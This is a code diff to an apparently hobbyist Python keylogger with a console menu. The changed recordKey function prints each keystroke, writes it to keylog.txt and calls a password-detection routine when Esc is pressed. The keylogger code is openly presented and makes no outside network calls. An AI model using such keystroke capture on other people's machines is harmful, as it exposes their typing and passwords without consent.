@@ -16,6 +16,7 @@ from ft_deleteFile import deleteFile
 '''
 
 def menu():
+
     system("clear")
     print("+============= MENU =============+")
     print("|1. recordKey (CTRL+ESC to back) |")
@@ -26,12 +27,10 @@ def menu():
     print("|6. Exit                         |")
     print("+================================+")
 
-    exit = False
-    option = 0
-    while (not exit):
-        option = validateNumber()
+    option = validateNumber()
+    if (option > 0 and option < 7):
         if option == 1:
-            with Listener(on_press=recordKey, on_release=on_release) as listener:
+            with Listener(on_press=recordKey) as listener:
                 listener.join()
         elif option == 2:
             readLogs()
@@ -43,9 +42,9 @@ def menu():
             deleteFile('keylog.txt')
         elif option == 6:
             print("Exit. Thanks for use this program")
-            exit = True
-        else:
-            print("\nError, enter a number between 1 - 4\n")
+            exit()
+    else:
+        print("\nError, enter a number between 1 - 4\n")
 
 
 '''
@@ -53,20 +52,14 @@ Function to capture keyboard events
 '''
 
 def recordKey(key):
-    printDataConsole(key)
-    saveInFile(key)
-
-
-'''
-Function to capture keyboard events. CTRL+ESC to detect password
-'''
-
-def on_release(key):
     key=str(key)
+    printDataConsole(key)
     if key == 'Key.esc':
         detectEIPassword()
         sys.stdout.flush()
-        menu()
+        return False
+    saveInFile(key)
+
 
 '''
 Function to display the text on the screen
